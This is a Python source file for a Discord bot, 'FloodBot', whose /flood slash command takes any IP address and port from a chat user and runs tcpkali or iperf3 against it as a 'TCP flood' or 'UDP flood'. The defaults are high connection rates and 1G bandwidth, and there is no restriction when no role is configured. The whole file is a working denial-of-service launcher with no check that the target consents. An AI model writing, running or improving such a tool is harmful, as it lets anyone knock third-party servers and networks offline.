# bot.py
import os
import asyncio
import subprocess
from typing import Literal

import discord
from discord import app_commands
from discord.ext import commands

# ─── Configuration ──────────────────────────────────────────────────────────────
BOT_TOKEN       = os.getenv("DISCORD_TOKEN")
ALLOWED_ROLE_ID = int(os.getenv("FLOODER_ROLE_ID", "0"))  # 0 = no restriction
# Default parameters for tools:
DEFAULT_TCP_CONNS   = 1000
DEFAULT_TCP_RATE    = 30000
DEFAULT_TCP_DUR     = 5      # seconds
DEFAULT_UDP_BW      = "1G"   # iperf3 bandwidth
DEFAULT_UDP_DUR     = 5      # seconds
# ────────────────────────────────────────────────────────────────────────────────

class FloodBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.none()
        super().__init__(command_prefix="!", intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        # Register the commands with Discord
        self.tree.add_command(flood)
        await self.tree.sync()

bot = FloodBot()

def has_flood_role(interaction: discord.Interaction) -> bool:
    if ALLOWED_ROLE_ID == 0:
        return True
    return any(role.id == ALLOWED_ROLE_ID for role in interaction.user.roles)

async def run_subprocess(cmd: list[str], timeout: float) -> tuple[int,str]:
    """Run a subprocess for `timeout` seconds, then terminate."""
    proc = await asyncio.create_subprocess_exec(
        *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    try:
        await asyncio.sleep(timeout)
        proc.terminate()
        await proc.wait()
    except Exception:
        proc.kill()
    out, err = await proc.communicate()
    return proc.returncode, err.decode().strip()

@bot.tree.command(name="flood", description="Start a TCP or UDP flood")
@app_commands.describe(
    tool="Which tool to use: tcpkali or iperf3",
    ip="Target IPv4 address",
    port="Target port (for tcpkali or iperf3 client)",
    conns="(tcpkali) number of connections to keep open",
    rate="(tcpkali) new connections per second",
    bw="(iperf3) bandwidth string, e.g. 100M, 1G",
    dur="Duration in seconds",
)
async def flood(
    interaction: discord.Interaction,
    tool: Literal["tcpkali", "iperf3"],
    ip: str,
    port: int,
    conns: int | None = None,
    rate: int | None = None,
    bw: str | None = None,
    dur: int | None = None,
):
    # Permission check
    if not has_flood_role(interaction):
        await interaction.response.send_message("🚫 You lack permissions.", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)

    # Fill defaults
    dur    = dur or (DEFAULT_TCP_DUR if tool == "tcpkali" else DEFAULT_UDP_DUR)
    if tool == "tcpkali":
        conns = conns or DEFAULT_TCP_CONNS
        rate  = rate  or DEFAULT_TCP_RATE
        cmd = [
            "tcpkali",
            "--connections", str(conns),
            "--connect-rate", str(rate),
            "--duration", str(dur),
            f"{ip}:{port}",
        ]
        desc = f"TCP flood → {ip}:{port}, {conns} conns @ {rate}/s for {dur}s"
    else:  # iperf3
        bw    = bw or DEFAULT_UDP_BW
        cmd = [
            "iperf3",
            "-c", ip,
            "-u",
            "-b", bw,
            "-t", str(dur),
            "-p", str(port),
            "-y", "C",  # CSV output to speed up exit
        ]
        desc = f"UDP flood → {ip}:{port}, {bw} bandwidth for {dur}s"

    # Run the tool
    exitcode, stderr = await run_subprocess(cmd, timeout=dur + 1)

    if exitcode == 0:
        content = f"✅ Completed {tool} flood:\n{desc}"
    else:
        content = f"⚠️ `{tool}` exited {exitcode}\n```{stderr}```"

    await interaction.followup.send(content)

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
